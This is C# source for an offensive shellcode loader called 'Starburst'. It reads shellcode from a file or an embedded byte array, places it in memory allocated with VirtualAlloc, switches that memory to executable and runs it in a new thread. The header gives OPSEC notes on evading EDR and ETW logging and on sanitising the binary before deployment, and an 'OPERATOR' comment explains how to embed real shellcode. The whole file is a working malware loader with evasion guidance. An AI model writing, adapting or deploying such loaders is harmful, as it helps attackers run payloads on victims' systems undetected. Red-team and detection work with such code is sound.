// ============================================================================
// Starburst C# Loader - Basic VirtualAlloc + CreateThread
// ============================================================================
// Compile: csc /unsafe /out:loader.exe Loader.cs
// Usage:   loader.exe [shellcode.bin]
//          If no argument, uses embedded shellcode byte array.
// OPSEC Notes:
//   - P/Invoke calls to kernel32 are monitored by EDR via ntdll hooks.
//   - VirtualAlloc + CreateThread is a well-known shellcode pattern.
//   - .NET assemblies can be decompiled trivially (use obfuscator).
//   - Assembly metadata (name, GUID) is visible - sanitize before deployment.
//   - Consider SectionLoader.cs or DInvoke.cs for better evasion.
//   - CLR loading events are logged (ETW Microsoft-Windows-DotNETRuntime).
//   - The /unsafe flag is required for pointer operations.
// ============================================================================

using System;
using System.IO;
using System.Runtime.InteropServices;

namespace Starburst
{
    class Loader
    {
        // --- Win32 API imports ---
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(
            IntPtr lpAddress,
            uint dwSize,
            uint flNewProtect,
            out uint lpflOldProtect
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out uint lpThreadId
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        // Constants
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint INFINITE = 0xFFFFFFFF;

        // --- OPERATOR: Replace with actual shellcode bytes if not loading from file ---
        // Generate with: xxd -i starburst.bin | sed 's/unsigned char/byte[]/'
        static byte[] embeddedShellcode = new byte[] {
            0xfc, 0x48, 0x83, 0xe4, 0xf0  // PLACEHOLDER - replace with real shellcode
        };

        static void Main(string[] args)
        {
            byte[] shellcode;

            // Load shellcode from file argument or use embedded bytes
            if (args.Length > 0 && File.Exists(args[0]))
            {
                try
                {
                    shellcode = File.ReadAllBytes(args[0]);
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine("Error reading shellcode file: " + ex.Message);
                    return;
                }
            }
            else
            {
                shellcode = embeddedShellcode;
            }

            if (shellcode == null || shellcode.Length == 0)
            {
                Console.Error.WriteLine("Error: No shellcode to execute");
                return;
            }

            // Allocate RW memory
            IntPtr address = VirtualAlloc(
                IntPtr.Zero,
                (uint)shellcode.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            );

            if (address == IntPtr.Zero)
            {
                Console.Error.WriteLine("Error: VirtualAlloc failed");
                return;
            }

            // Copy shellcode to allocated memory
            Marshal.Copy(shellcode, 0, address, shellcode.Length);

            // Clear shellcode from managed memory
            Array.Clear(shellcode, 0, shellcode.Length);

            // Flip memory protection from RW to RX
            uint oldProtect;
            if (!VirtualProtect(address, (uint)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect))
            {
                Console.Error.WriteLine("Error: VirtualProtect failed");
                return;
            }

            // Create thread at shellcode address
            uint threadId;
            IntPtr threadHandle = CreateThread(
                IntPtr.Zero,
                0,
                address,
                IntPtr.Zero,
                0,
                out threadId
            );

            if (threadHandle == IntPtr.Zero)
            {
                Console.Error.WriteLine("Error: CreateThread failed");
                return;
            }

            // Wait for thread to complete
            WaitForSingleObject(threadHandle, INFINITE);
            CloseHandle(threadHandle);
        }
    }
}
